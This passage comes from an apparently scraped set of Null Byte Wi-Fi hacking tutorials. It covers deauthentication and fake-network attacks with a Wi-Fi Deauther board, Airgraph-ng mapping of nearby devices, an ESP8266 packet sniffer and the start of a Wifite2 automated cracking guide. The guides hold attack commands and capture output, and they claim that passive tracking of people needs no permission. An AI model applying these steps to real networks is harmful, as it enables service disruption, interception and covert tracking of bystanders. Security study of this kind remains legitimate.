agree, you'll have access to the control interface for the device.\nStep 3: Perform a Scan of the Area\nFirst, let's take a scan of the area around us. The first page you'll find yourself on is the \"Scan\" page, which breaks down results into a few easy to understand categories. First, there are access points. This will give you a list of every device advertising a Wi-fi network in range.\nFurther down the list, you'll see devices that are connected to a network, as well as which network they are connected to. You can select the \"Add\" button to save a particular device or network to your target list. Here, we'll select \"spot 2.4 ghz\" as the network we want to target.\nOnce you've selected a network to target, we can move on to the \"SSIDs\" menu by clicking on the menu shortcut in the top left of the screen.\nStep 4: Select Target Networks\nIn the \"SSIDs\" section, we'll be able to clone networks, create fake networks, or simply Rickroll everyone.\nThe top field is for specifying any fake network we want to create. This includes the SSID, or network name, whether or not the network uses WPA security, and how many networks you want to create.\nIf you selected an access point before, you can click \"Clone Selected APs\" to generate clones of the targeted network. There is also a module to generate random SSIDs, including several that are just the lines to \"Never Gonna Give You Up.\"\nIn the image below, we cloned the network many times, making it very hard to find the correct network.\nStep 5: Launch an Attack\nNow, let's check out the attacks we can launch in the \"Attacks\" section of the menu. Here, we can see three primary kinds of attacks.\n* Deauth: This will attack any network in range, disconnecting it from Wi-Fi until you disable it. It's worth mentioning that you are connected to the device via Wi-Fi, and this makes it likely that you may unintentionally prevent yourself from connecting to the device to turn it off. If you find yourself disconnected and you can't get back in, you may need to unplug the board to get it to stop.\n* Beacon: This attack will create up to a thousand fake networks, either cloning nearby networks or creating entirely fake ones from scratch.\n* Probe: Here, the board will send probe requests asking for a network name that's in the list you specify. This will confuse some Wi-Fi trackers and also sometimes cause Wi-Fi attack tools to create fake networks in response to the network names contained in the probe requests.\nTo begin the deauthentication attack, make sure you are somewhere where the only networks that are in range are ones you have permission to attack. Once you are, click the \"Start\" button next to the \"Deauth\" attack. When you feel the Wi-Fi devices in your local area have had enough punishment, click \"Stop\" to end the attack.\nThe original Wi-Fi Deauther board also comes with the ability to add an external antenna. By doing so, it's possible to extend or change the range of the device by adding a directional antenna.\nStep 6: Customize Your Settings\nNow that we've explored the main attacks, we can also configure the board via the \"Settings\" tab on the top left of the screen. Clicking on it will bring up a menu page allowing you to do things like change the name of the network used to communicate with the board, change the password, and change the channel the device broadcasts its network on.\nHere, you'll also find an option to create a \"Hidden\" network, which might seem more stealthy to connect to. In fact, any device you connect to a hidden network will start calling out that network name any time the Wi-Fi is left on, making your phone more trackable.\nThe reasons devices that have connected to a hidden network always call for them is because they know the station is not broadcasting its network name, so it's up to your device to always be asking if it is nearby.\nYou can customize settings as much as you like here, but be careful not to disable the Wi-Fi portal and the serial connection at the same time. Doing so will leave you with no way to communicate with the board, so make sure you leave at least one enabled to allow you to get back in.\nOnce you update your password and the name of your command-and-control Wi-Fi network, you're ready to use the Wi-Fi Deauther anywhere, from any device. After making any changes to the menu or any other settings, make sure to press \"Save\" and \"Reload\" to apply the changes you made.\nMicrocontrollers Are Cheap, Efficient Cyber Weapons\nThe Raspberry Pi was revolutionary in giving access to powerful hacking tools to anyone who can afford a $35 board. With the Wi-Fi Deauther board, the boundaries of what can be done with low-cost Wi-Fi hardware has been pushed even further than before.\nWhile microcontrollers don't offer a full operating system to work with like a Raspberry Pi, the powerful attacks they're capable of on their own make them more than worth checking out. While the Wi-Fi Deauther board can't capture the numerous WPA handshakes it generates from nearby networks while in operation by itself, it's a perfect companion tool for capturing WPA handshakes in Kali for later cracking.\nI hope you enjoyed this guide to the Wi-Fi Deauther project! If you have any questions about this tutorial on the Wi-Fi Deauther board, leave a comment below, and feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Spy on Network Relationships with Airgraph-Ng",
        "link": "https://null-byte.wonderhowto.com/how-to/spy-network-relationships-with-airgraph-ng-0193309/",
        "content": "* WonderHowTo\nWhat if you could easily visualize which access point every Wi-Fi device nearby is connected to in a matter of seconds? While programs like Airodump-ng can intercept this wireless information, making it easy for hackers to use and understand is another challenge. Fortunately, a tool called Airgraph-ng can visualize the relationships between Wi-Fi devices from only a few seconds of wireless observation.\nSignals Intelligence with Wi-Fi Devices\nSignals intelligence is the science of understanding human behavior and systems behind intercepted radio signals. To understand how to attack a target, we want the maximum amount of information about the target surface area we have to consider. Without being connected to a network with encryption, like WPA or WPA2, we can't rely on tricks like sending packets to scan for other connected devices because we're on the outside looking in.\nWe can't read the traffic flowing between devices, but we can watch the relationship between Wi-Fi devices like laptops, smartphones, and IoT products to learn about the network and the people behind them. To understand how a network is connected, we can sniff the Wi-Fi radio traffic in the area to discover which devices are currently connected to an access point, building a list of relationships.\nRecommended on Amazon: IoT Hackers Handbook: An Ultimate Guide to Hacking the Internet of Things and Learning IoT Security\nFor an attacker, this means the ability to walk through a building and create a map of which access point every printer, security camera, and laptop is connected to. It's also possible to learn the names of networks nearby Wi-Fi devices have connected to recently, making it easy to create a fake network they will connect to automatically.\nMaking Intercepted Signals Readable\nAnother use for this kind of analysis is determining whether a device representing a person, like a smartphone, is present at a location. Creating a map of when someone comes and goes based on their Wi-Fi activity is an easy way of understanding when someone is home or using certain devices.\nFor this kind of signals analysis, Kismet is one of the best ways of scanning the relationships between nearby devices. In spite of how useful it is, setting it up takes work and interpreting the results isn't always straightforward. Here, after some setup, we're able to zero in on a popular public access point, learning about the devices that are currently connected to it.\nThe information from Kismet is a lot for a beginner to absorb. While Kismet gives an operator the ability to discover and then spy on the Wi-Fi activity of any device connected to a nearby network Wi-Fi network, there is an easier way of showing a tactical snapshot of the local Wi-Fi environment.\n* Don't Miss: Use Kismet to Watch Wi-Fi User Activity Through Walls\nUsing Aigraph-ng, we can make a graphical version of this information. We can take all of this text data and convert it into a graphical snapshot of the relationships between nearby devices and the networks they are connected to. This gives immediate visibility to the topography of Wi-Fi networks in range.\nAirgraph-Ng for Signals Interpretation\nTo learn about the topography of nearby networks and display the results as a graph, we'll need to collect and then process the data. For collection, we'll use a program installed by default in Kali Linux called Airodump-ng. This program will \"dump\" the Wi-Fi data packets we intercept with our wireless network adapter to a file. This CSV file will allow us to easily process what we've discovered and generate a PNG graph showing the relationships detected.\nFor processing the packets we intercept, we'll be using another program installed by default, Airgraph-ng. This program can visualize two types of information useful for a hacker. The first type of graph is a CAPR, or client access point relationship graph. This graph shows a map of every device currently connected to an access point and which network they are currently connected to.\nThe second kind of chart shows us the names of networks that W-Fi devices not currently connected to an access point are calling out for. This can reveal a list of networks we could create to lure nearby devices into connecting.\nAirgraph-ng is pretty straightforward, as can be seen by its manual page entry.\nairgraph-ng - a 802.11 visualization utility\nairgraph-ng [options]\nDESCRIPITION\nairgraph-ng graphs the CSV file generated by Airodump-ng. The idea is that we are showing the\nrelationships of the clients to the AP's so don't be shocked if you see only one  mapping  as\nyou may only have captured one client\n-h     Shows the help screen.\n-i     Airodump-ng CSV file\n-o     Output png file.\n-g     Choose the Graph Type. Current types are [CAPR (Client to AP Relationship) & CPG (Com‐\nmon probe graph)].\n-a     Print the about.\nairgraph-ng -i dump-01.csv -o dump.png -g CAPR\nairgraph-ng -i dump-01.csv -o dump.png -g CPG\nWhat You'll Need\n* More Info: Buy the Best Wireless Network Adapter for Wi-Fi Hacking in 2019\nYou should be running Kali Linux in a virtual machine, dual-booted, or in another fashion that allows Kali to access the network adapter. If you're doing so in a virtual machine, you'll need to connect the USB adapter to the virtual machine for it to appear.\nFor this guide, you do not need to be connected to a network and you do not need permission to make these observations. The information is being broadcasted unencrypted, which means we are merely observing.\nGood Long-Range Adapter on Amazon: Alfa AWUS036NHA Wireless B/G/N USB Adapter - 802.11n - 150 Mbps - 2.4 GHz - 5 dBi Antenna\nStep 1: Update Your System & Install if Needed\nIf you're running Kali Linux, you should have everything you need installed. First, we'll need to update and ensure we have the Aircrack-ng suite. To do so, connect your Kali computer to the internet and run the following commands in a terminal window.\napt upgrade\napt install aircrack-ng\nNow, let's check that we have the programs installed. Run the following commands to see the help output for each program.\nairodump-ng --help\nAirodump-ng 1.5.2  - (C) 2006-2018 Thomas d'Otreppe\nhttps://www.aircrack-ng.org\nusage: airodump-ng <options> <interface>[,<interface>,...]\n--ivs                 : Save only captured IVs\n--gpsd                : Use GPSd\n--write      <prefix> : Dump file prefix\n-w                    : same as --write\n--beacons             : Record all beacons in dump file\n--update       <secs> : Display update delay in seconds\n--showack             : Prints ack/cts/rts statistics\n-h                    : Hides known stations for --showack\n-f            <msecs> : Time in ms between hopping channels\n--berlin       <secs> : Time before removing the AP/client\nfrom the screen when no more packets\nare received (Default: 120 seconds)\n-r             <file> : Read packets from that file\n-x            <msecs> : Active Scanning Simulation\n--manufacturer        : Display manufacturer from IEEE OUI list\n--uptime              : Display AP Uptime from Beacon Timestamp\n--wps                 : Display WPS information (if any)\n--output-format\n<formats> : Output format. Possible values:\npcap, ivs, csv, gps, kismet, netxml, logcsv\n--ignore-negative-one : Removes the message that says\nfixed channel <interface>: -1\n--write-interval\n<seconds> : Output file(s) write interval in seconds\n--background <enable> : Override background detection.\nFilter options:\n--encrypt   <suite>   : Filter APs by cipher suite\n--netmask <netmask>   : Filter APs by mask\n--bssid     <bssid>   : Filter APs by BSSID\n--essid     <essid>   : Filter APs by ESSID\n--essid-regex <regex> : Filter APs by ESSID using a regular\n-a                    : Filter unassociated clients\nBy default, airodump-ng hops on 2.4GHz channels.\nYou can make it capture on other/specific channel(s) by using:\n--ht20                : Set channel to HT20 (802.11n)\n--ht40-               : Set channel to HT40- (802.11n)\n--ht40+               : Set channel to HT40+ (802.11n)\n--channel <channels>  : Capture on specific channels\n--band <abg>          : Band on which airodump-ng should hop\n-C    <frequencies>   : Uses these frequencies in MHz to hop\n--cswitch  <method>   : Set channel switching method\n0       : FIFO (default)\n1       : Round Robin\n2       : Hop on last\n-s                    : same as --cswitch\n--help                : Displays this usage screen\nairgraph-ng --help\nUsage: airgraph-ng options [-o -i -g ]\n-h, --help            show this help message and exit\n-o OUTPUT, --output=OUTPUT\nOur Output Image ie... Image.png\n-i INPUT, --dump=INPUT\nAirodump txt file in CSV format. NOT the pcap\n-g GRAPH_TYPE, --graph=GRAPH_TYPE\nGraph Type Current [CAPR (Client to AP Relationship)\nOR CPG (Common probe graph)]\nIf you see the help output for both Airodump-ng and Airgraph-ng, then we're ready to start intercepting and interpreting packets!\nStep 2: Plug in Your Card & Enable Monitor Mode\nPlug in the wireless network adapter you intend to use to sniff Wi-Fi packets. This should be a wireless network adapter that is compatible with Kali Linux. The Alfa AWUS036NHA is a solid one to use, but there are plenty more that may fit your needs better.\n* Don't Miss: Check if Your Wireless Network Adapter Supports Monitor Mode\nOnce you've plugged in your adapter, we can put it into monitor mode by using another program installed with Aircrack-ng. We'll use Airmon-ng to put our card into monitor mode, after running ifconfig to get the name of our network adapter. In our example, our adapter is named \"wlan2.\"\nairmon-ng start wlan2\nFound 3 processes that could cause trouble.\nKill them using 'airmon-ng check kill' before putting\nthe card in monitor mode, they will interfere by changing channels\nand sometimes putting the interface back in managed mode\n561 NetworkManager\n627 wpa_supplicant\n3561 dhclient\nPHY Interface   Driver      Chipset\nphy0    wlan0       ath9k       Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01)\nphy5    wlan2       rt2800usb   Ralink Technology, Corp. RT2870/RT3070\n(mac80211 monitor mode vif enabled for [phy5]wlan2 on [phy5]wlan2mon)\n(mac80211 station mode vif disabled for [phy5]wlan2)\nNow, run ifconfig again. You should see that your card has mon added to the end. This means that your card is now in wireless monitor mode, and you're ready to proceed to the next step.\nStep 3: Run Airodump-Ng & Save CSV File\nNow that our wireless card can listen in on any Wi-Fi packet in the area, we need to start recording this information to a file. We'll use Airodump-ng to do this, effectively dumping all packets received on our network adapter to a file for us to interpret later.\nRemembering the name of our wireless network adapter which is now in monitor mode, run the following command to save all packets intercepted by the interface \"wlan2mon\" (or whatever yours is called) to a file named capturefile.\nairodump-ng wlan2mon -w capturefilename\nCH 10 ][ Elapsed: 4 mins ][ 2019-02-03 21:32\nBSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n14:CC:20:6D:22:BA  -26       69        0    0   8  130  WPA2 CCMP   PSK  CafeMak4_2.4G\nAA:6B:AD:6F:AC:55  -31      136        0    0   6   65  WPA2 CCMP   PSK  DIRECT-HQHL-L9310CDW_BRac55\nEC:1D:7F:F9:10:03  -33      159        0    0   6   65  WPA2 CCMP   PSK  cafemak_pwm\n2C:FD:A1:E4:9D:50  -40      109      152    0   9  260  WPA2 CCMP   PSK  CafeMak1_2.4G\n84:1B:5E:E9:8A:1A  -52      136     3668    0  11  54e  WPA2 CCMP   PSK  CafeMak6_2.4G\n16:18:D6:04:F1:1E  -58       54        2    0   1  195  WPA2 CCMP   PSK  770staff1\n26:18:D6:04:F1:1E  -59       74        0    0   1  195  WPA2 CCMP   PSK  770guest\nF8:18:97:65:BC:F3  -59       50        0    0   1  130  WPA2 CCMP   PSK  ATT717_guest\n06:18:D6:04:F1:1E  -60       52        0    0   1  195  WPA2 CCMP   PSK  exec\n04:18:D6:04:F1:1E  -60       87        0    0   1  195  WPA2 CCMP   PSK  770org\n3C:36:E4:F7:6D:20  -61       84        0    0   6  130  WPA2 CCMP   PSK  ATT120\n36:18:D6:04:EF:0F  -62       71        0    0   6  195  WPA2 CCMP   PSK  <length:  0>\n06:18:D6:04:EF:0F  -62       66        0    0   6  195  WPA2 CCMP   PSK  exec\n36:18:D6:04:F1:1E  -62       64        0    0   1  195  WPA2 CCMP   PSK  <length:  0>\n04:18:D6:04:EF:0F  -63      123        0    0   6  195  WPA2 CCMP   PSK  770org\nF8:18:97:65:BC:F2  -64       46        5    0   1  130  WPA2 CCMP   PSK  ATT717\n04:18:D6:04:2E:FA  -64       44        0    0   1  195  WPA2 CCMP   PSK  rb\n26:18:D6:04:EF:0F  -64       97        0    0   6  195  WPA2 CCMP   PSK  770guest\n16:18:D6:04:EF:0F  -64       78        0    0   6  195  WPA2 CCMP   PSK  770staff1\nA0:8C:FD:B7:9D:A9  -65       68        0    0   6   65  WPA2 CCMP   PSK  DIRECT-A8-HP OfficeJet 4650\nE8:8D:28:60:BE:77  -68       63        3    0   6  195  WPA2 CCMP   PSK  Joel's Wi-Fi Network\nWhen we're done collecting packets, you can type Ctrl-c to stop the capture. This will generate a CSV file containing all the information we need.\nStep 4: Generate a Graph of AP Relationships (Connected Devices)\nNow, it's time to generate our first graph from the wireless data we've intercepted. You can think of this data like metadata, telling us which devices were calling each other, but not what they were saying.\nFirst, we'll start a graph of the client AP relationships. After locating the CSV file we created, run the following command in a terminal window to create a CAPR graph of which device is connected to which access point. Replace \"CAPRintercept.png\" with the name of the graph you want to create, and '/root/Desktop/cafemak-01.csv' with the path to the CSV file.\nairgraph-ng -o CAPRintercept.png -i '/root/Desktop/cafemak-01.csv' -g CAPR\n**** WARNING Images can be large, up to 12 Feet by 12 Feet****\nCreating your Graph using, /root/Desktop/cafemak-01.csv and writing to, cafemak.png\nDepending on your system this can take a bit. Please standby......\nThis should generate a graph to explore. Here we can see an example showing the relationship between access points and devices, clearly giving an overview of the local network topography.\nStep 5: Generate a Graph of Probe Frames (Disconnected Devices)\nNext, let's target devices nearby which are not currently connected to an AP. From these devices, we can learn the names of networks they have been connected to before, allowing us to potentially trick them into connecting to a fake version with the same name.\n* Don't Miss: Log Wi-Fi Probe Requests from Smartphones & Laptops\nTo get this information, we'll just re-process the data we intercepted into a different kind of graph. There is no need to go back and collect more information, we're just going to visualize it in another way.\nOpen a terminal window and type the following commands, swapping out \"CPGintercept.png\" for the name of the file you want to save the graph under, and '/root/Desktop/cafemak-01.csv' again for the location of the CSV file you created earlier from the captured data.\nairgraph-ng -o CPGintercept.png -i '/root/Desktop/cafemak-01.csv' -g CPG\n**** WARNING Images can be large, up to 12 Feet by 12 Feet****\nCreating your Graph using, /root/Desktop/cafemak-01.csv and writing to, cafemak.png\nDepending on your system this can take a bit. Please standby......\nAirgraph-ng should generate a new graph showing networks nearby devices are calling out for. This can allow you to also identify which networks can make multiple nearby devices connect.\nInterpret the Results\nFor a hacker or penetration tester, the previous two graphs provide a goldmine of information. In the first, we're able to see which access point every nearby device is connected to, allowing us to isolate or capture clients onto fake MITM networks if we identify a target. Because of this, we can create a fake version of a network a device is currently connected to, kick them off the real network, and cause them to automatically connect to the fake version.\nIn the second graph, we're able to identify networks we could create that would cause several different devices to connect. These graphs can also reveal devices using MAC address randomization, because even devices that change their MAC address may call out for a network with a unique name as they continue to change their MAC.\nHackers can use this information about the type of hardware present and the way it's connected to come up with a plan of attack against a network. Because this attack is totally passive and requires no interaction with the network, the risk of being caught snooping on this information is almost nonexistent.\nI hope you enjoyed this guide to using Airgraph-ng for Wi-Fi signals intelligence! If you have any questions about this tutorial on Wi-Fi recon or you have a comment, ask below or feel free to reach me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Inconspicuously Sniff Wi-Fi Data Packets Using an ESP8266",
        "link": "https://null-byte.wonderhowto.com/how-to/inconspicuously-sniff-wi-fi-data-packets-using-esp8266-0192829/",
        "content": "* 5 volt power supply (optional, for power away from your computer)\n* CR1220 battery (optional, only for the real-time clock)\nOn Amazon: RobotDyn IoT Kit with D1 Mini, USB Cable & Data Logger Shield\nThe free, cross-platform Arduino IDE will allow us to quickly prototype what we need, so make sure you have that installed on your computer. The Arduino integrated development environment allows us to quickly write and upload scripts to Arduino-like microcontroller devices.\nStep 1: Install the New Arduino Library\nTo get this project working, we'll need to install some libraries that enable everything to communicate. We need the radio of the microcontroller to save packets to the microSD card, so that means we need libraries for communicating with the microSD card and interpreting the radio signals into meaningful data to save. To install any library in Arduino is pretty simple and usually comes with some helpful example sketches to build off of.\nTo start, in the Arduino IDE, open the folder named \"Arduino\" where Arduino IDE saves your sketch files. You should see a folder called \"Libraries,\" which should be saved in the location listed below for your OS. If you add a library here, it will then show up in the Import Library menu.\n* macOS: ~/Documents/Arduino/libraries/\n* Windows: My Documents\\Arduino\\libraries\\\nIn a terminal window, change directory into the folder where your Arduino libraries are kept, and then use git clone to copy the Arduino PCAP repository, the Arduino Time Library, and the ESP8266 dependency from GitHub.\ncd ~/Documents/Arduino/libraries/\ngit clone https://github.com/spacehuhn/ArduinoPcap.git\ngit clone https://github.com/PaulStoffregen/Time.git\ngit clone https://github.com/esp8266/Arduino.git\nThis is the folder that Arduino IDE checks for custom libraries every time it starts. In general, there are two ways for you to add a library. You can click on \"Sketch\" in the top menu bar, then \"Include Library,\" and finally \"Manage Libraries\" to open the search bar.\nHere, you can search for libraries that are popular in the community and download them directly. This is one of the easiest ways to download things like the neopixel library from Adafruit or the SdFat library needed to write to our microSD card. Type in \"sdfat,\" and download the SdFat library by clicking \"Install.\" This will allow us to include it in any of our sketches from now on.\nClose and restart the Arduino IDE to make sure they are all loaded.\nStep 2: Install the Board Library\nNow, we need to tell Arduino IDE what hardware we're working with. Click on the \"Arduino\" drop-down menu, then select \"Preferences.\" Next, paste the following URL into the Additional Boards Manager URLs field. Click \"OK\" to continue. This should add the ESP8266-related boards to the list of boards we can install.\nhttp://arduino.esp8266.com/stable/package_esp8266com_index.json\nTo add the specific D1 Mini we're using, you'll need to click on \"Tools,\" then hover over the \"Board\" section to see the list of supported boards. At the top, click \"Boards Manager\" to open the window that will allow us to add more boards.\n* Don't Miss: Use an ESP8266 Beacon Spammer to Track Smartphone Users\nWhen the Boards Manager window opens, type \"esp8266\" into the search bar. Select \"esp8266\" by ESP8266 Community, and install it to add support for the D1 Mini to your Arduino IDE. You may find it's already installed from the previous step, but make sure to update it if an update is available.\nNow, you should see a section called \"ESP8266 Modules\" under the \"Board\" selector. Select the \"WeMos D1 R2 & mini\" board, and you should be ready to go.\nStep 3: Modify Any Settings in the Code\nTo open an example sketch to work with, go to the Arduino menu, and then click on File –> Examples –> Arduino Pcap. Here, you should see an example called \"esp8266_pcap_sd\" — open the sketch, as we'll be using it as a template for what we send to the D1 Mini. If you want to do this on the more powerful ESP32, you can follow the same steps and select the ESP32 instead.\nOnce the sketch is open, you'll see the main configuration settings.\n//===== SETTINGS =====//\n#define CHANNEL 1\n#define FILENAME \"esp8266\"\n#define SAVE_INTERVAL 30 //save new file every 30s\n#define CHANNEL_HOPPING true //if true it will scan on all channels\n#define MAX_CHANNEL 11 //(only necessary if channelHopping is true)\n#define HOP_INTERVAL 214 //in ms (only necessary if channelHopping is true)\nLet's start setting these so that we can sniff effectively. First, we'll set the channel for the device to sniff on. The most commonly used network channels are 1, 6 and 11, so we'll set this to 6.\n#define CHANNEL 6\nNext, we'll decide how long we want to wait before saving the file to the microSD card. The D1 Mini doesn't have that much memory, so doing so every 30 seconds or so is a good idea. You can also name the file it generates something differently here. Increasing the time leads to larger file sizes but higher chance the device becomes overwhelmed with too much traffic.\n#define FILENAME \"esp8266\"\n#define SAVE_INTERVAL 30 //save new file every 30s\nNow, let's decide if we want to channel hop or not. This will allow us to see traffic and devices using other channels, but will also chop up a lot of the packets when we switch between networks and make them unusable. As a result, this is a choice between getting a variety of packets from a lot of different channels or focusing on one channel without the worry of fragmentation. In our example, we'll avoid fragmentation by setting the value to false.\nIf we choose to channel hop, we can set how high the channel will go to as well. In the US, Wi-Fi networks don't use channels over 11, but other countries do. For here though, it's only useful to set it to 11.\n#define CHANNEL_HOPPING false //if true it will scan on all channels\n#define MAX_CHANNEL 11 //(only necessary if channelHopping is true)\nIf we've chosen to enable channel hopping, we can scale back some of the damage fragmentation does to our sample by setting the next value to longer. A longer value here means more time spent sniffing on each channel, leading to less packet fragmentation from samples.\n#define HOP_INTERVAL 214 //in ms (only necessary if channelHopping is true)\nOur control settings should now look something like this.\n//===== SETTINGS =====//\n#define CHANNEL 6\n#define FILENAME \"nullbyte\"\n#define SAVE_INTERVAL 30 //save new file every 30s\n#define CHANNEL_HOPPING false //if true it will scan on all channels\n#define MAX_CHANNEL 11 //(only necessary if channelHopping is true)\n#define HOP_INTERVAL 214 //in ms (only necessary if channelHopping is true)\nStep 4: Connect the Hardware Together\nNow, it's time to connect the hardware. If you got your D1 Mini and a data-logger shield online, you'll need to solder the pins on, which is surprisingly easy (trust me). With the D1 Mini, make sure you solder in pin headers that you can plug the data-logger down into, like in the example below.\nImage by Kody/Null Byte\nIf you don't want to solder and want to support Spacehuhn's work, you can also buy a board from his web store.\nStep 5: Push the Code & Sniff Packets\nNow, it's time to connect everything. Insert the microSD card into the module, plug in the USB cable to your computer and the D1 mini, and click on the \"Tools\" menu, then the \"Port\" section. You should see a \"Serial\" port listed, which may already be selected. If it isn't, select it here. If you don't see the right serial port, it likely means that you don't have the correct driver installed to see the D1 Mini's USB interface and will need to install it.\nOnce you see the serial port, you're ready to push the code! First, check that the code compiles with no errors by clicking on the check mark button on the top left of the screen. Then, click the arrow button next to the check mark to send the code to the D1 Mini.\nAfter this is done, click on \"Tools,\" and then \"Serial Monitor\" to see the status of the D1 Mini. Set the baud rate to 115,200, as it will look like random characters otherwise.\nIf you see a message like above, then you have success! You're able to log PCAP files to the SD card, and as soon as you're done logging, you can unplug the device, pop out the microSD, and load them it into a computer to see the results.\nWith a small coin cell battery to power the real-time clock and a USB power source (Micro-USB cable connected to a power adapter or computer) for the whole unit, your logger can operate independently for as long as the SD card has space.\nYou could also go with a battery pack via a battery shield (or another battery setup) for the D1 Mini instead of a running power via the Micro-USB port, but it's not recommended since you won't want to use the Micro-USB port at all or you'll risk frying something, plus a battery won't last long. However, one interesting idea to save power for a battery project could be to add a passive infrared sensor to only turn on the logger when movement is detected, logging Wi-Fi traffic from nearby devices any time people are detected as being present.\nTradeoffs with the ESP8266\nWhile the Arduino PCAP library is an awesome way to get started sniffing, there are a fair amount of limitations. The ESP8266 doesn't have the range of a more powerful wireless network adapter, and it's much more likely to corrupt frames or otherwise miss recording packets for various reasons.\nOne thing to keep in mind is that there will always be several channels the sniffer can't listen on while it's scanning on any particular channel, so if you collect Wi-Fi traffic by scanning through every channel, you're likely to get a lot of fragmentation. Instead, setting the sniffer to listen on one channel only will make it more likely to capture everything, provided you know the channel your target network is on.\nI hope you enjoyed this guide to sniffing Wi-Fi on an ESP8266 microcontroller! If you like this project and want to see more, you can support Spacehuhn on Patreon. And if you have any questions about this tutorial on the ESP8266 or if you have a comment, feel free to put it below or reach out to me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Automate Wi-Fi Hacking with Wifite2",
        "link": "https://null-byte.wonderhowto.com/how-to/automate-wi-fi-hacking-with-wifite2-0191739/",
        "content": "* WonderHowTo\nThere are many ways to attack a Wi-Fi network. The type of encryption, manufacturer settings, and the number of clients connected all dictate how easy a target is to attack and what method would work best. Wifite2 is a powerful tool that automates Wi-Fi hacking, allowing you to select targets in range and let the script choose the best strategy for each network.\nWifite2 vs. Wifite\nWifite has been around for some time and was one of the first Wi-Fi hacking tools I was introduced to. Along with Besside-ng, automated Wi-Fi hacking scripts enabled even script kiddies to have a significant effect without knowing much about the way the script worked. Compared to Besside-ng, the original Wifite was very thorough in using all available tools to attack a network, but it could also be very slow.\nOne of the best features of the original Wifite was the fact that it performed a Wi-Fi site survey before attacking nearby networks, allowing a hacker to easily designate one, some, or all nearby networks as targets. By laying out available targets in an easy to understand format, even a beginner could understand what attacks might work best against nearby networks.\n* Don't Miss: Automating Wi-Fi Hacking with Besside-ng\nThe original Wifite would automatically attack WPA networks by attempting to capture a handshake or by using the Reaver tool to brute-force the WPS setup PIN of nearby networks. While this method was effective, it could prove to take 8 hours or more to complete.\nThe updated WiFite2 is much faster, churning through attacks in less time and relying on more refined tactics than the previous version. Because of this, Wifite2 is a more serious and powerful Wi-Fi hacking tool than the original Wifite.\nAttack Flow for Wi-Fi Hacking\nWifite2 follows a simple but effective workflow for hacking nearby networks as rapidly as possible. To do so, it pushes each tactic it tries to the practical limit, even going to far as to try to crack any handshakes it retrieves.\nIn the first step, Wifite2 scans across all channels looking for any network in range. It ranks these networks it discovers by signal strength, as a network being detected does not ensure you can reliably communicate with it.\nOrganized from strongest to weakest signal strength, the reconnaissance phase involves gathering information about what networks are around and which hacking techniques they might be vulnerable to. Because of the way Wifite2 is organized, it's easy to add a directional Wi-Fi antenna to use Wifite2 to locate the source of any nearby Wi-Fi network while performing a site survey.\n* Don't Miss: Hack WPA & WPA2 Wi-Fi Passwords with a Pixie-Dust Attack\nAfter the site survey is complete, any targets displayed will show whether there are clients connected, whether the network advertises WPS, and what kind of encryption the network is using. Based on this, an attacker can select any target, a group of targets, or all targets to begin an attack based on the information gathered.\nWifite2 will progress through the target list starting with fastest and easiest attacks, like WPS-Pixie, which can result in a password being breached in seconds, on to less sure tactics like checking for weak passwords with a dictionary attack. If an attack fails or takes too long, Wifite2 will move on to the next applicable attack without wasting hours like its predecessor was prone to doing.\nWhat You'll Need\nTo get started, you'll need a Wi-Fi network adapter you can put into wireless monitor mode. This means selecting one that is compatible with Kali Linux, which we have several excellent guides on doing.\nWifite2 is installed by default on Kali Linux, so I recommend you either use Kali in a virtual machine or dual-booted on a laptop. You can use Wifite2 on other Linux systems, but I won't go through the installation as this guide assumes you're using Kali Linux.\nRecommended Adapter: Alfa AWUS036NHA\nStep 1: Install Wifite2\nIf you don't have Wifite2 installed on your system already, you can do so from the GitHub repository. First, you can clone the repository by opening a terminal window and typing the following commands.\ngit clone https://github.com/derv82/wifite2.git\nsudo python setup.py install\nThis should download and install Wifite2 on your system. To test if it worked, you can type wifite -h to see information about the version installed.\n.               .\n.´  ·  .     .  ·  `.  wifite 2.1.6\n:  :  :  (¯)  :  :  :  automated wireless auditor\n`.  ·  ` /¯\\ ´  ·  .´  https://github.com/derv82/wifite2\n`     /¯¯¯\\     ´\noptional arguments:\n-h, --help           show this help message and exit\n-v, --verbose        Shows more options (-h -v). Prints commands and outputs. (default: quiet)\n-i [interface]       Wireless interface to use (default: choose first or ask)\n-c [channel]         Wireless channel to scan (default: all channels)\n-mac, --random-mac   Randomize wireless card MAC address (default: off)\n-p [scantime]        Pillage: Attack all targets after scantime seconds\n--kill               Kill processes that conflict with Airmon/Airodump (default: off)\n--clients-only, -co  Only show targets that have associated clients (default: off)\n--nodeauths          Passive mode: Never deauthenticates clients (default: deauth targets)\n--wep                Filter to display only WEP-encrypted networks (default: off)\n--require-fakeauth   Fails attacks if fake-auth fails (default: off)\n--keep-ivs           Retain .IVS files and reuse when cracking (default: off)\n--wpa                Filter to display only WPA-encrypted networks (includes WPS)\n--new-hs             Captures new handshakes, ignores existing handshakes in ./hs (default: off)\n--dict [file]        File containing passwords for cracking (default: /usr/share/wordlists/fern-wifi/common.txt)\n--wps                Filter to display only WPS-enabled networks\n--bully              Use bully instead of reaver for WPS attacks (default: reaver)\n--no-wps             NEVER use WPS attacks (Pixie-Dust) on non-WEP networks (default: off)\n--wps-only           ALWAYS use WPS attacks (Pixie-Dust) on non-WEP networks (default: off)\n-ev, --eviltwin      Use the \"Evil Twin\" attack against all targets (default: off)\n--cracked            Display previously-cracked access points\n--check [file]       Check a .cap file (or all hs/*.cap files) for WPA handshakes\n--crack              Show commands to crack a captured handshake\nStep 2: Plug in Your Wi-Fi Card\nWith Wifite2 installed on your system, you'll need to plug in your Kali Linux-compatible wireless network adapter. Wifite2 takes care of not only auto-selecting a wireless network adapter to use but also puts that wireless card into monitor mode for you, meaning you don't need to do anything after plugging in the adapter.\nStep 3: Set Flags & Find a Target\nIf we know what channel we're attacking on, we can select it by adding the -c command followed by the channel number. Other than that, running Wifite2 is as simple as typing wifite and letting the script gather information.\nwifite -c 11\n.               .\n.´  ·  .     .  ·  `.  wifite 2.1.6\n:  :  :  (¯)  :  :  :  automated wireless auditor\n`.  ·  ` 